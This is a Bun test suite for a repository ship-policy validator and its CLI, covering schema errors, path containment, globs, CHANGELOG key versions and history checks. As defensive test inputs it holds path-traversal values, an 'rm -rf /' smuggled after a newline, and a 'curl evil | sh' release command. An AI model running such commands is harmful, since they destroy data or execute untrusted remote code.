/**
 * C1: the repo ship policy. Pins the wire contract (exit codes, result codes,
 * the `policy:` provenance line, every containment refusal) on fixture repos
 * under os.tmpdir(), never on prose.
 */
import { afterEach, describe, expect, test } from 'bun:test';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { spawnSync } from 'node:child_process';
import { EXIT } from '../lib/headless-artifacts';
import { CHANGELOG_FRAGMENTS_KEY_VERSION, DEFAULT_POLICY, POLICY_KEYS, POLICY_KEY_INTRODUCED, REVIEW_SCOPE_KEY_VERSION, globToRegExp, matchesAny, validatePolicy } from '../lib/ship-policy';
import { fillDue } from '../lib/ship-queue-train';
import { cmpVersion, parseVersion } from '../lib/version-source';
import { BASE_POLICY, cleanup, makeFixtureRepo, runBin, type FixtureRepo } from './helpers/restamp-fixture';

const repos: FixtureRepo[] = [];
const fixture = (opts?: Parameters<typeof makeFixtureRepo>[0]) => { const r = makeFixtureRepo(opts); repos.push(r); return r; };
afterEach(() => { while (repos.length) cleanup(repos.pop()!); });

describe('validatePolicy (schema + containment, pure)', () => {
  test('defaults validate and every key has an explanation', () => {
    expect(validatePolicy(DEFAULT_POLICY)).toEqual([]);
    expect(validatePolicy(BASE_POLICY)).toEqual([]);
    expect(POLICY_KEYS).toContain('queue_mode');
  });

  test('unknown keys, enums and types are POLICY_INVALID with the key named', () => {
    const codes = (p: unknown) => validatePolicy(p).map(e => `${e.code}:${e.path}`);
    expect(codes({ bumpp: 'patch' })).toEqual(['POLICY_INVALID:bumpp']);
    expect(codes({ bump: 'minor' })).toEqual(['POLICY_INVALID:bump']);
    expect(codes({ queue_mode: 'stamp-at-open' })).toEqual(['POLICY_INVALID:queue_mode']);
    expect(codes({ history: 'rebase' })).toEqual(['POLICY_INVALID:history']);
    expect(codes({ release_tool: 42 })).toEqual(['POLICY_INVALID:release_tool']);
    expect(codes({ pr_count: { default_pr_count: 0, split_requires_owner: 'yes' } })).toEqual(['POLICY_INVALID:pr_count.default_pr_count', 'POLICY_INVALID:pr_count.split_requires_owner']);
    expect(codes({ review_scope: 'loose' })).toEqual(['POLICY_INVALID:review_scope', 'POLICY_INVALID:review_scope']);
    expect(codes({ review_scope: 'all' })).toEqual(['POLICY_INVALID:review_scope']);
    expect(codes({ review_scope: 'all', min_gstack_version: REVIEW_SCOPE_KEY_VERSION })).toEqual([]);
    expect(codes({ review_scope: 'diff-plus-blocking', min_gstack_version: REVIEW_SCOPE_KEY_VERSION })).toEqual([]);
    // The constant is the release that first read the key; any earlier minimum would admit a gstack that fails on the unknown key.
    const earlier = REVIEW_SCOPE_KEY_VERSION.replace(/(\d+)\.0$/, (_, p) => `${Number(p) - 7}.0`);
    expect(codes({ review_scope: 'all', min_gstack_version: earlier })).toEqual(['POLICY_INVALID:review_scope']);
    expect(codes({ review_scope: 'frozen' })).toEqual([]);
    expect(codes([])).toEqual(['POLICY_INVALID:']);
  });

  test('containment fixtures: `..`, absolute paths, ~, control bytes, list and size caps, interior mirror `..`', () => {
    const codes = (p: unknown) => validatePolicy(p).map(e => `${e.code}:${e.path}`);
    expect(codes({ stamp_paths: ['../victim/**'] })).toEqual(['POLICY_CONTAINMENT:stamp_paths[0]']);
    expect(codes({ stamp_paths: ['docs/../../etc/*'] })).toEqual(['POLICY_CONTAINMENT:stamp_paths[0]']);
    expect(codes({ stamp_paths: ['/etc/passwd'] })).toEqual(['POLICY_CONTAINMENT:stamp_paths[0]']);
    expect(codes({ release_outputs: ['C:\\Windows\\*'] })).toEqual(['POLICY_CONTAINMENT:release_outputs[0]']);
    expect(codes({ changelog: '~/CHANGELOG.md' })).toEqual(['POLICY_CONTAINMENT:changelog']);
    expect(codes({ changelog: 'CHANGE\nLOG.md' })).toEqual(['POLICY_CONTAINMENT:changelog']);
    expect(codes({ stamp_paths: Array.from({ length: 65 }, (_, i) => `d${i}/**`) })).toEqual(['POLICY_CONTAINMENT:stamp_paths']);
    expect(codes({ stamp_paths: ['a'.repeat(257)] })).toEqual(['POLICY_CONTAINMENT:stamp_paths[0]']);
    expect(codes({ release_tool: 'x'.repeat(513) })).toEqual(['POLICY_CONTAINMENT:release_tool']);
    expect(codes({ release_tool: 'bun run a\nrm -rf /' })).toEqual(['POLICY_CONTAINMENT:release_tool']);
    expect(codes({ mirror: '../sibling' })).toEqual([]);
    expect(codes({ mirror: '../sibling/../../other' })).toEqual(['POLICY_CONTAINMENT:mirror']);
    expect(codes({ mirror: '/abs/mirror' })).toEqual(['POLICY_CONTAINMENT:mirror']);
    expect(codes({ mirror: '.' })).toEqual(['POLICY_CONTAINMENT:mirror']);
    expect(codes({ mirror: '..' })).toEqual(['POLICY_CONTAINMENT:mirror']);
    expect(codes({ preregistration_shas: ['not-a-sha'] })).toEqual(['POLICY_CONTAINMENT:preregistration_shas[0]']);
  });

  test('globs: ** spans directories, * stays in a segment, regex caps hold, regex metacharacters are literal', () => {
    expect(matchesAny(['docs/**/*.md'], 'docs/a/b/c.md')).toBe(true);
    expect(matchesAny(['docs/**/*.md'], 'docs/c.md')).toBe(true);
    expect(matchesAny(['docs/*.md'], 'docs/a/c.md')).toBe(false);
    expect(matchesAny(['README.md'], 'README.md')).toBe(true);
    expect(matchesAny(['README.md'], 'READMEXmd')).toBe(false);
    expect(matchesAny(['a+b(c).md'], 'a+b(c).md')).toBe(true);
    expect(() => globToRegExp('?'.repeat(150))).toThrow(/512/);
    expect(validatePolicy({ stamp_paths: ['?'.repeat(150)] }).map(e => e.code)).toEqual(['POLICY_CONTAINMENT']);
  });
});

describe('policy key versions against the CHANGELOG', () => {
  test('an unreleased key names a release newer than every heading the checkout can see', () => {
    // The base branch's CHANGELOG counts when the checkout has it (a depth-1 CI clone does not; the file is past 1 MiB,
    // so spawnSync needs the explicit maxBuffer or it drops the read silently): a stamp-at-merge
    // branch carries main's headings only after the slot merge, and a release stamped under another number
    // leaves the constant naming a release that never read the key, which the stamper moves by hand.
    const root = path.join(import.meta.dir, '..');
    const base = spawnSync('git', ['show', 'origin/main:CHANGELOG.md'], { cwd: root, encoding: 'utf8', timeout: 30_000, maxBuffer: 64 * 1024 * 1024 });
    const text = fs.readFileSync(path.join(root, 'CHANGELOG.md'), 'utf8') + (base.status === 0 ? base.stdout : '');
    const parse = (v: string) => v.split('.').map(Number);
    const cmp = (a: number[], b: number[]) => a[0]! - b[0]! || a[1]! - b[1]! || a[2]! - b[2]! || a[3]! - b[3]!;
    const headings = [...text.matchAll(/^## \[(\d+\.\d+\.\d+\.\d+)\]/gm)].map(m => m[1]!);
    const newest = headings.map(parse).sort(cmp).at(-1)!;
    for (const [key, version] of Object.entries(POLICY_KEY_INTRODUCED)) {
      if (headings.includes(version)) continue;
      expect(cmp(parse(version), newest), `${key} is introduced in ${version}, which has no CHANGELOG heading and is not newer than the newest heading ${newest.join('.')}; an unreleased key names the release that will stamp it`).toBeGreaterThan(0);
    }
  });

  test('a released key names the heading whose entry introduces it, so a tentative version no stamp moved fails', () => {
    // #3487 was written naming the next version and main stamped that number for another PR first, so the constant
    // pointed at a release that never read `docs` while the heading existed and the test above skipped it. A key version that is
    // a heading must be the one whose entry names the key (`\`<key>` at a word boundary in the section body, so `\`docs/` paths do not count); lib/ship-policy.ts sits in
    // stamp_paths so the slot stamp moves a tentative value there itself. Keys from before the convention are exempt.
    const root = path.join(import.meta.dir, '..');
    const base = spawnSync('git', ['show', 'origin/main:CHANGELOG.md'], { cwd: root, encoding: 'utf8', timeout: 30_000, maxBuffer: 64 * 1024 * 1024 });
    const text = fs.readFileSync(path.join(root, 'CHANGELOG.md'), 'utf8') + (base.status === 0 ? base.stdout : '');
    const sections = new Map<string, string>();
    for (const part of text.split(/^(?=## \[)/m)) {
      const heading = /^## \[(\d+\.\d+\.\d+\.\d+)\]/.exec(part);
      if (heading && !sections.has(heading[1]!)) sections.set(heading[1]!, part);
    }
    const parse = (v: string) => v.split('.').map(Number);
    const cmp = (a: number[], b: number[]) => a[0]! - b[0]! || a[1]! - b[1]! || a[2]! - b[2]! || a[3]! - b[3]!;
    for (const [key, version] of Object.entries(POLICY_KEY_INTRODUCED)) {
      if (cmp(parse(version), parse(REVIEW_SCOPE_KEY_VERSION)) < 0) continue;
      const section = sections.get(version);
      if (section === undefined) continue;
      expect(new RegExp('`' + key + '(?![A-Za-z0-9_/-])').test(section), `${key} is introduced in ${version}, but that release's CHANGELOG entry never names \`${key}: the constant still holds the tentative version the branch was written with; the slot stamp moves it through stamp_paths, or move it to the release that shipped the key`).toBe(true);
    }
  });
});

describe("gstack's own .gstack/ship-policy.json", () => {
  test('validates and declares the merge-train block against workflows that exist', () => {
    const root = path.join(import.meta.dir, '..');
    const raw = JSON.parse(fs.readFileSync(path.join(import.meta.dir, '..', '.gstack', 'ship-policy.json'), 'utf8'));
    expect(validatePolicy(raw)).toEqual([]);
    expect(raw.train).toMatchObject({ gate_workflow: 'evals.yml', free_workflow: 'free-tests.yml', full_gate_check: 'gstack/full-gate', record_artifact: 'gstack-train-record' });
    for (const wf of [raw.train.gate_workflow, raw.train.free_workflow]) expect(fs.existsSync(path.join(root, '.github/workflows', wf))).toBe(true);
  });

  // Value: protects=train land on gstack itself: every changelog_fragments.required_checks name is a job of a pull_request workflow without a path filter, so a stamp commit always gets it; fails_when=a name is misspelled, names a path-filtered workflow's job, or names a job id GitHub reports under its `name:` instead, and train land holds every slot whose PR skips those paths; why_new=the key was off on gstack; seam=the policy file and .github/workflows; no_claim=that the checks pass
  test('turns changelog_fragments on with required checks every PR runs', () => {
    const root = path.join(import.meta.dir, '..');
    const raw = JSON.parse(fs.readFileSync(path.join(root, '.gstack', 'ship-policy.json'), 'utf8'));
    expect(raw.changelog_fragments.dir).toBe('changelog.d');
    expect(fs.existsSync(path.join(root, 'changelog.d', 'README.md'))).toBe(true);
    expect(cmpVersion(parseVersion(raw.min_gstack_version)!, parseVersion(CHANGELOG_FRAGMENTS_KEY_VERSION)!)).toBeGreaterThanOrEqual(0);
    const jobs = new Set<string>();
    for (const f of fs.readdirSync(path.join(root, '.github/workflows')).filter(f => f.endsWith('.yml'))) {
      const text = fs.readFileSync(path.join(root, '.github/workflows', f), 'utf8');
      const on = text.slice(text.search(/^on:/m), text.search(/^jobs:/m));
      if (!/^\s+pull_request:/m.test(on) || /^\s+paths(-ignore)?:/m.test(on)) continue;
      const body = text.slice(text.search(/^jobs:/m));
      for (const m of body.matchAll(/^  ([A-Za-z0-9_-]+):\n((?:    .*\n|\s*\n)*)/gm)) {
        const name = /^    name:\s*(.+)$/m.exec(m[2]!)?.[1]?.trim();
        jobs.add(name ?? m[1]!);
      }
    }
    expect(raw.changelog_fragments.required_checks.filter((n: string) => !jobs.has(n))).toEqual([]);
  });

  // Value: protects=the fill rule the coordinator relies on: a train dispatches at 3 READY PRs or one hour after the first READY, whichever comes first
  // (2026-10-26: 5 PRs / 3 hours left READY PRs waiting most of a day); fails_when=the live block drifts back to a larger or slower fill; why_new=the values were unpinned; seam=the policy file; no_claim=fillDue's arithmetic (ship-queue-train-logic)
  test('fills a train at 3 READY PRs or one hour after the first READY, whichever comes first', () => {
    const raw = JSON.parse(fs.readFileSync(path.join(import.meta.dir, '..', '.gstack', 'ship-policy.json'), 'utf8'));
    expect([raw.train.max_size, raw.train.fill_hours]).toEqual([3, 1]);
    const first = '2026-10-26T09:00:00.000Z';
    const slots = (n: number) => Array.from({ length: n }, (_, i) => ({ pr: i + 1, ready_at: new Date(Date.parse(first) + i * 60_000).toISOString() })) as any;
    expect(fillDue(slots(2), raw.train, '2026-10-26T09:59:00Z', false)).toBe('2026-10-26T10:00:00.000Z');
    expect(fillDue(slots(2), raw.train, '2026-10-26T10:00:00Z', false)).toBeNull();
    expect(fillDue(slots(3), raw.train, '2026-10-26T09:05:00Z', false)).toBeNull();
  });
});

describe('gstack-ship-policy (bin)', () => {
  test('--help prints the exit table; no command is usage (2)', () => {
    const repo = fixture();
    expect(runBin(repo, 'gstack-ship-policy', ['--help']).out).toContain('Exit codes: 0 ok · 1 fail · 2 usage · 3 refused or needs a flag');
    expect(runBin(repo, 'gstack-ship-policy', []).status).toBe(EXIT.usage);
    expect(runBin(repo, 'gstack-ship-policy', ['bogus']).status).toBe(EXIT.usage);
  });

  test('show-effective reads origin/<base>, labels each value with its source, and --json carries the policy', () => {
    const repo = fixture();
    const r = runBin(repo, 'gstack-ship-policy', ['show-effective', '--base', 'main']);
    expect(r.status).toBe(EXIT.ok);
    expect(r.out).toMatch(/^policy: base origin\/main@[0-9a-f]{12}:\.gstack\/ship-policy\.json\n/);
    expect(r.out).toContain('queue_mode="stamp-at-merge"  (origin/main@');
    expect(r.out).toContain('bump="patch"  (origin/main@');
    expect(r.out).toContain('mirror=null  (default)');
    expect(r.out).toMatch(/^ship: queue_mode stamp-at-merge: Step 12 items 1-4 are replaced by `gstack-restamp --next --base main --pr <pr-number> --expect-base <base-sha>`/m);
    expect(r.out).toMatch(/^ship: gate-ahead: .*gstack-tree-receipt --from \.gstack\/tmp\/gate-ahead\.json/m);
    expect(r.out).toMatch(/^ship: bump patch: Step 12 never asks/m);
    expect(r.out).toMatch(/^ship: release_tool: `node gen\.js` runs only inside gstack-restamp/m);
    expect(r.out).not.toMatch(/^ship: history/m);
    expect(r.out).not.toMatch(/^ship: changelog_fragments/m);
    const frag = fixture({ policy: { ...BASE_POLICY, changelog_fragments: { dir: 'changelog.d/' }, min_gstack_version: '1.91.336.0' } });
    expect(runBin(frag, 'gstack-ship-policy', ['show-effective', '--base', 'main']).out).toMatch(/^ship: changelog_fragments changelog\.d: Step 12 writes no version and Step 13 writes the entry as changelog\.d\/<branch-slug>\.md .*never an \[Unreleased\] section; lint it with `gstack-prose-lint changelog\.d\/<branch-slug>\.md --gate`/m);
    const strict = fixture({ policy: { ...BASE_POLICY, history: 'merge-only', queue_mode: 'claim-at-open', bump: 'ask', release_tool: null, preregistration_shas: ['0123456789abcdef0123456789abcdef01234567'] } });
    const lines = runBin(strict, 'gstack-ship-policy', ['show-effective', '--base', 'main']).out.split('\n').filter(l => l.startsWith('ship: '));
    expect(lines.map(l => l.split(':')[1]!.trim())).toEqual(['history merge-only', 'queue_mode claim-at-open', 'bump ask', 'review_scope frozen', 'preregistration']);
    const j = JSON.parse(runBin(repo, 'gstack-ship-policy', ['show-effective', '--base', 'main', '--json']).out);
    expect(j.valid).toBe(true);
    expect(j.source.kind).toBe('base');
    expect(j.policy.release_tool).toBe('node gen.js');
    expect(j.values.release_tool).toMatch(/^origin\/main@/);
    expect(j.values.mirror).toBe('default');
  });

  test('the working-tree copy is never used silently: a PR editing the policy changes show-effective (base) nothing, validate (head) reads it', () => {
    const repo = fixture();
    repo.git('checkout', '-q', '-b', 'pr');
    fs.writeFileSync(path.join(repo.work, '.gstack', 'ship-policy.json'), JSON.stringify({ ...BASE_POLICY, release_tool: 'curl evil | sh' }) + '\n');
    const base = JSON.parse(runBin(repo, 'gstack-ship-policy', ['show-effective', '--base', 'main', '--json']).out);
    expect(base.policy.release_tool).toBe('node gen.js');
    const head = JSON.parse(runBin(repo, 'gstack-ship-policy', ['validate', '--json']).out);
    expect(head.policy.release_tool).toBe('curl evil | sh');
    expect(head.source.kind).toBe('head');
    expect(runBin(repo, 'gstack-ship-policy', ['show-effective', '--policy-from', 'head']).out).toMatch(/^policy: head \(unreviewed\)/);
  });

  test('POLICY_SOURCE_UNAVAILABLE (exit 3) when origin/<base> does not resolve; no fallback to the working tree', () => {
    const repo = fixture();
    const r = runBin(repo, 'gstack-ship-policy', ['show-effective', '--base', 'release']);
    expect(r.status).toBe(EXIT.refused);
    expect(r.err).toMatch(/policy source unavailable.*fix: git fetch origin release --depth=1.*\(POLICY_SOURCE_UNAVAILABLE\)/);
    expect(r.out).toBe('');
  });

  test('absent policy on base: defaults apply and the provenance says so', () => {
    const repo = fixture({ policy: null });
    const r = runBin(repo, 'gstack-ship-policy', ['show-effective', '--base', 'main']);
    expect(r.status).toBe(EXIT.ok);
    expect(r.out).toMatch(/^policy: none \(defaults\) origin\/main@[0-9a-f]{12} \(no \.gstack\/ship-policy\.json\)/);
    expect(runBin(repo, 'gstack-ship-policy', ['validate']).out).toBe('POLICY_VALID: no .gstack/ship-policy.json (defaults apply)\n');
  });

  test('validate: an invalid committed policy lists POLICY_INVALID / POLICY_CONTAINMENT lines and exits 1', () => {
    const repo = fixture({ policy: { bump: 'patch', stamp_paths: ['../x'], extra: 1 } });
    const r = runBin(repo, 'gstack-ship-policy', ['validate']);
    expect(r.status).toBe(EXIT.fail);
    expect(r.err).toMatch(/\(POLICY_INVALID\)/);
    expect(r.err).toMatch(/\(POLICY_CONTAINMENT\)/);
    expect(r.out).toMatch(/^POLICY_INVALID: 2 error\(s\)/);
    const malformed = fixture({ policy: null });
    fs.writeFileSync(path.join(malformed.work, '.gstack', 'ship-policy.json'), '{ not json');
    expect(runBin(malformed, 'gstack-ship-policy', ['validate']).err).toMatch(/not valid JSON.*\(POLICY_INVALID\)/);
  });

  test('init writes every key at its default with $schema, refuses to overwrite (POLICY_EXISTS, nothing written), --explain prints each key', () => {
    const repo = fixture({ policy: null });
    const r = runBin(repo, 'gstack-ship-policy', ['init']);
    expect(r.status).toBe(EXIT.ok);
    const written = JSON.parse(fs.readFileSync(path.join(repo.work, '.gstack', 'ship-policy.json'), 'utf8'));
    expect(written.$schema).toMatch(/ship-policy\.md#schema-v1$/);
    for (const key of POLICY_KEYS) expect(written[key]).toEqual((DEFAULT_POLICY as any)[key]);
    expect(validatePolicy(written)).toEqual([]);
    fs.writeFileSync(path.join(repo.work, '.gstack', 'ship-policy.json'), '{"bump":"patch"}\n');
    const again = runBin(repo, 'gstack-ship-policy', ['init']);
    expect(again.status).toBe(EXIT.refused);
    expect(again.err).toMatch(/nothing written.*\(POLICY_EXISTS\)/);
    expect(fs.readFileSync(path.join(repo.work, '.gstack', 'ship-policy.json'), 'utf8')).toBe('{"bump":"patch"}\n');
    const explain = runBin(repo, 'gstack-ship-policy', ['init', '--explain']);
    expect(explain.status).toBe(EXIT.ok);
    for (const key of POLICY_KEYS) expect(explain.out).toMatch(new RegExp(`^${key}: .* default: `, 'm'));
    expect(fs.readFileSync(path.join(repo.work, '.gstack', 'ship-policy.json'), 'utf8')).toBe('{"bump":"patch"}\n');
  });

  test('check-history: squash-ok prints no check; merge-only accepts a fast-forward branch, refuses a rewritten one (exit 1) and a squash/rebase plan (exit 3) with HISTORY_POLICY_VIOLATION', () => {
    const repo = fixture({ policy: { ...BASE_POLICY, history: 'merge-only' } });
    repo.git('checkout', '-q', '-b', 'pr');
    fs.writeFileSync(path.join(repo.work, 'a.txt'), 'a\n');
    repo.git('add', '-A'); repo.git('commit', '-q', '-m', 'a');
    expect(runBin(repo, 'gstack-ship-policy', ['check-history', '--base', 'main']).out).toMatch(/^HISTORY: merge-only \(origin\/pr not pushed yet/);
    repo.git('push', '-q', '-u', 'origin', 'pr');
    fs.writeFileSync(path.join(repo.work, 'b.txt'), 'b\n');
    repo.git('add', '-A'); repo.git('commit', '-q', '-m', 'b');
    const ok = runBin(repo, 'gstack-ship-policy', ['check-history', '--base', 'main', '--json']);
    expect(ok.status).toBe(EXIT.ok);
    expect(JSON.parse(ok.out)).toMatchObject({ history: 'merge-only', ok: true });
    repo.git('reset', '-q', '--soft', 'origin/main');
    repo.git('commit', '-q', '-m', 'squashed');
    const bad = runBin(repo, 'gstack-ship-policy', ['check-history', '--base', 'main']);
    expect(bad.status).toBe(EXIT.fail);
    expect(bad.out).toMatch(/^HISTORY: rewritten .* \(HISTORY_POLICY_VIOLATION\)$/m);
    const plan = runBin(repo, 'gstack-ship-policy', ['check-history', '--base', 'main', '--plan', 'squash']);
    expect(plan.status).toBe(EXIT.refused);
    expect(plan.out).toMatch(/^HISTORY: refused \(plan=squash rewrites history; .*\) — fix: .* \(HISTORY_POLICY_VIOLATION\)$/m);
    expect(runBin(repo, 'gstack-ship-policy', ['check-history', '--base', 'main', '--plan', 'cherry']).status).toBe(EXIT.usage);
    const lax = fixture();
    expect(runBin(lax, 'gstack-ship-policy', ['check-history', '--base', 'main']).out).toBe('HISTORY: squash-ok (no check; policy history=squash-ok; plan=merge)\n');
    expect(runBin(lax, 'gstack-ship-policy', ['check-history', '--base', 'main', '--plan', 'rebase']).status).toBe(EXIT.ok);
  });
});
